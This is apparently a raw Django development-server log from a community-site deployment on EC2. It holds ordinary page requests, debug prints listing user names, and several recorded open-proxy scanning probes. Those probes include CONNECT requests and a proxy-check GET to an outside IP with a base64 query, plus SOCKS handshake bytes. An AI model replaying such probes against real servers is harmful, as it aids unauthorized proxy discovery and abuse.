[12/Dec/2018 13:01:38] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:01:38] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:01:39] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:01:47] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:01:49] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:01:51] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:01:52] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:01:54] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:02:04] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:02:05] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:02:09] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 13:02:10] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 13:02:16] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 13:02:16] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 13:02:18] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:02:22] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:02:27] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:02:29] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 13:02:30] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 13:02:42] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:02:49] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:02:51] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:02:55] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:03:01] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 13:03:02] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:03:06] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:03:09] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:03:11] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:03:13] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:03:18] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:03:20] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:03:21] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:03:22] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:03:22] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:03:22] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:03:22] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:03:27] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:03:28] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 13:03:40] "GET / HTTP/1.1" 400 62427
[12/Dec/2018 13:03:43] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:03:46] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:03:51] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:03:56] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:04:53] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:04:54] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:04:57] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:04:59] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:05:04] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:05:22] "GET /community/3/ HTTP/1.1" 200 11312
[12/Dec/2018 13:05:39] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:05:41] "GET /profile/4/communities_as_admin HTTP/1.1" 200 5416
[12/Dec/2018 13:05:48] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:05:50] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:05:51] "GET /requests HTTP/1.1" 200 5821
[12/Dec/2018 13:05:54] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:06:03] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:06:54] "GET /creategroup/ HTTP/1.1" 200 8404
[12/Dec/2018 13:06:56] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:07:00] "GET /creategroup/ HTTP/1.1" 200 8404
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 13:07:08] "GET / HTTP/1.0" 400 62437
[12/Dec/2018 13:12:24] "GET /profile/4/mycommunities HTTP/1.1" 200 7142
[12/Dec/2018 13:12:26] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 13:12:55] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 13:12:56] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 13:13:04] "GET /community/4/ HTTP/1.1" 200 12573
Not Found: /robots.txt
[12/Dec/2018 13:14:35] "GET /robots.txt HTTP/1.1" 404 5961
[12/Dec/2018 13:14:39] "GET /community/3 HTTP/1.1" 301 0
[12/Dec/2018 13:14:42] "GET /community/4/ HTTP/1.1" 200 12573
[12/Dec/2018 13:14:43] "GET /community/3/ HTTP/1.1" 200 10877
[12/Dec/2018 13:15:17] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 13:15:24] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 13:15:24] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 13:17:09] "GET / HTTP/1.1" 400 62437
Not Found: /togther/dashboard/
[12/Dec/2018 13:19:04] "GET /togther/dashboard/ HTTP/1.1" 404 5985
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 13:29:05] "GET / HTTP/1.1" 400 62427
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 13:55:51] "GET / HTTP/1.1" 400 62716
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 14:05:11] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 14:38:17] "GET / HTTP/1.1" 400 62426
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 15:58:45] "GET / HTTP/1.0" 400 62438
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[12/Dec/2018 15:58:45] "GET / HTTP/1.0" 500 59
----------------------------------------
Exception happened during processing of request from ('189.155.26.214', 1991)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 16:01:48] "GET / HTTP/1.1" 400 62451
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 16:24:58] "GET / HTTP/1.0" 400 62437
Invalid HTTP_HOST header: '103.81.244.25:443'. You may need to add '103.81.244.25' to ALLOWED_HOSTS.
Bad Request: /103.81.244.25:443
Invalid HTTP_HOST header: '103.81.244.25'. You may need to add '103.81.244.25' to ALLOWED_HOSTS.
Invalid HTTP_HOST header: '103.81.244.25:80'. You may need to add '103.81.244.25' to ALLOWED_HOSTS.
Bad Request: /103.81.244.25:80
Bad Request: /http:/103.81.244.25/reply.php
[12/Dec/2018 16:26:17] "CONNECT 103.81.244.25:443 HTTP/1.1" 400 62788
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[12/Dec/2018 16:26:17] "CONNECT 103.81.244.25:443 HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('45.63.28.242', 17602)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[12/Dec/2018 16:26:17] "CONNECT 103.81.244.25:80 HTTP/1.1" 400 62767
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[12/Dec/2018 16:26:17] "CONNECT 103.81.244.25:80 HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('45.63.28.242', 17612)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
[12/Dec/2018 16:26:17] "GET http://103.81.244.25/reply.php?q=eyJpcCI6IjE4LjIyMC4zMS4xNDMiLCJwb3J0IjoiODAiLCJub2RucyI6dHJ1ZSwidHlwZSI6IldFQiIsImhhc2giOiJmYTVkZDJhM2M4YzBmN2Y1NjZmNDljODY0MjkzOGRlZCJ9 HTTP/1.1" 400 64368
[12/Dec/2018 16:26:31] code 400, message Bad request syntax ('\x04\x01\x01»gQô\x19\x00')
[12/Dec/2018 16:26:31] "»gQô " 400 -
[12/Dec/2018 16:26:31] code 400, message Bad request syntax ('\x05\x01\x00')
[12/Dec/2018 16:26:31] " " 400 -
[12/Dec/2018 16:26:47] code 400, message Bad request syntax ('\x05\x01\x00')
[12/Dec/2018 16:26:47] " " 400 -
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 16:29:02] "GET / HTTP/1.0" 400 62434
Invalid HTTP_HOST header: '103.81.244.25:443'. You may need to add '103.81.244.25' to ALLOWED_HOSTS.
Bad Request: /103.81.244.25:443
Invalid HTTP_HOST header: '103.81.244.25'. You may need to add '103.81.244.25' to ALLOWED_HOSTS.
[12/Dec/2018 16:35:39] "CONNECT 103.81.244.25:443 HTTP/1.1" 400 62616
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer
[12/Dec/2018 16:35:39] "CONNECT 103.81.244.25:443 HTTP/1.1" 500 59
----------------------------------------
Exception happened during processing of request from ('35.196.235.54', 60278)
Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 138, in run
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 279, in write
    self._write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 453, in _write
    result = self.stdout.write(data)
  File "/usr/lib64/python3.7/socketserver.py", line 796, in write
    self._sock.sendall(b)
ConnectionResetError: [Errno 104] Connection reset by peer

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 141, in run
    self.handle_error()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 86, in handle_error
    super().handle_error()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 368, in handle_error
    self.finish_response()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 180, in finish_response
    self.write(data)
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 274, in write
    self.send_headers()
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 331, in send_headers
    if not self.origin_server or self.client_is_modern():
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 344, in client_is_modern
    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
TypeError: 'NoneType' object is not subscriptable

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib64/python3.7/socketserver.py", line 647, in process_request_thread
    self.finish_request(request, client_address)
  File "/usr/lib64/python3.7/socketserver.py", line 357, in finish_request
    self.RequestHandlerClass(request, client_address, self)
  File "/usr/lib64/python3.7/socketserver.py", line 717, in __init__
    self.handle()
  File "/home/ec2-user/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 154, in handle
    handler.run(self.server.get_app())
  File "/usr/lib64/python3.7/wsgiref/handlers.py", line 144, in run
    self.close()
  File "/usr/lib64/python3.7/wsgiref/simple_server.py", line 35, in close
    self.status.split(' ',1)[0], self.bytes_sent
AttributeError: 'NoneType' object has no attribute 'split'
----------------------------------------
Bad Request: /http:/103.81.244.25/reply.php
[12/Dec/2018 16:35:39] "GET http://103.81.244.25/reply.php?q=eyJpcCI6IjE4LjIyMC4zMS4xNDMiLCJwb3J0IjoiODAiLCJub2RucyI6dHJ1ZSwidHlwZSI6IldFQiIsImhhc2giOiJmYTVkZDJhM2M4YzBmN2Y1NjZmNDljODY0MjkzOGRlZCJ9 HTTP/1.1" 400 64195
[12/Dec/2018 16:35:49] code 400, message Bad request syntax ('\x05\x01\x00')
[12/Dec/2018 16:35:49] " " 400 -
[12/Dec/2018 16:35:49] code 400, message Bad request syntax ('\x04\x01\x01»gQô\x19\x00')
[12/Dec/2018 16:35:49] "»gQô " 400 -
[12/Dec/2018 16:35:49] code 400, message Bad request syntax ('\x05\x01\x00')
[12/Dec/2018 16:35:49] " " 400 -
[12/Dec/2018 16:35:49] code 400, message Bad request syntax ('\x04\x01\x00PgQô\x19\x00')
[12/Dec/2018 16:35:49] " PgQô " 400 -
Invalid HTTP_HOST header: 'ip-172-31-17-20.us-east-2.compute.internal'. You may need to add 'ip-172-31-17-20.us-east-2.compute.internal' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 16:45:45] "GET / HTTP/1.0" 400 62438
Invalid HTTP_HOST header: '18.220.31.143'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 17:21:00] "GET / HTTP/1.1" 400 62549
Invalid HTTP_HOST header: '18.220.31.143:80'. You may need to add '18.220.31.143' to ALLOWED_HOSTS.
Bad Request: /
[12/Dec/2018 17:33:00] "GET / HTTP/1.1" 400 62433
[12/Dec/2018 17:40:45] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:40:47] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:40:47] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:40:47] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:40:49] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:40:50] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:40:57] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:40:58] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:41:06] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:41:07] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:41:08] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:41:08] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:41:10] "GET /?data=&_=1544636467739 HTTP/1.1" 200 516
Not Found: //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg
[12/Dec/2018 17:41:10] "GET //media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 404 6105
Not Found: //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg
[12/Dec/2018 17:41:11] "GET //media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 404 6159
[12/Dec/2018 17:43:34] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:43:35] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:43:35] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:43:36] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:43:39] "GET /profile/4 HTTP/1.1" 200 23252
[12/Dec/2018 17:43:41] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:43:41] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:43:41] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:43:43] "GET /login/ HTTP/1.1" 302 0
[12/Dec/2018 17:43:43] "GET / HTTP/1.1" 200 13948
[12/Dec/2018 17:43:44] "GET /media/media/logo.png HTTP/1.1" 200 11255
[12/Dec/2018 17:43:45] "GET /media/media/B4FA2A43-31EF-4C1A-8B47-7B63F9F553FA-5184-000000EA4CAE18F8.jpeg HTTP/1.1" 200 11233
[12/Dec/2018 17:43:45] "GET /media/media/jimmy-page-led-zeppelin-wallpaper_hQ4Mv7R.jpg HTTP/1.1" 200 102923
[12/Dec/2018 17:43:53] "GET /login/ HTTP/1.1" 302 0

2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
admin <QuerySet [<Admins: Admins object (2)>]>
2
admin:  [<QuerySet [<Userinfo: Nipun Goyal>]>]
5
<QuerySet [<Userinfo: Nipun Goyal>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
[<Userinfo: Nipun Goyal>, <Userinfo: Apoorv Khare>, <Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Abhishek Sharma>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
<QuerySet [<Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: test_community_1>]>
{}
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
admin <QuerySet [<Admins: Admins object (1)>]>
1
admin:  [<QuerySet [<Userinfo: Apoorv Khare>]>]
3
<QuerySet [<Userinfo: Apoorv Khare>]>
4
<QuerySet [<Userinfo: Abhishek Sharma>]>
5
<QuerySet [<Userinfo: Nipun Goyal>]>
[<Userinfo: Apoorv Khare>, <Userinfo: Abhishek Sharma>, <Userinfo: Nipun Goyal>]
{}
<QuerySet []>
[]
{}
<QuerySet []>
[]
{}
<QuerySet []>
[]
{}
<QuerySet []>
[]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
<QuerySet []>
[]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
: [<Community: test_community_1>, <Community: IIT Delhi Entrepreneurs in Gurgaon>, <Community: IIT Delhi Entrepreneurs in Gurgaon>]
{}
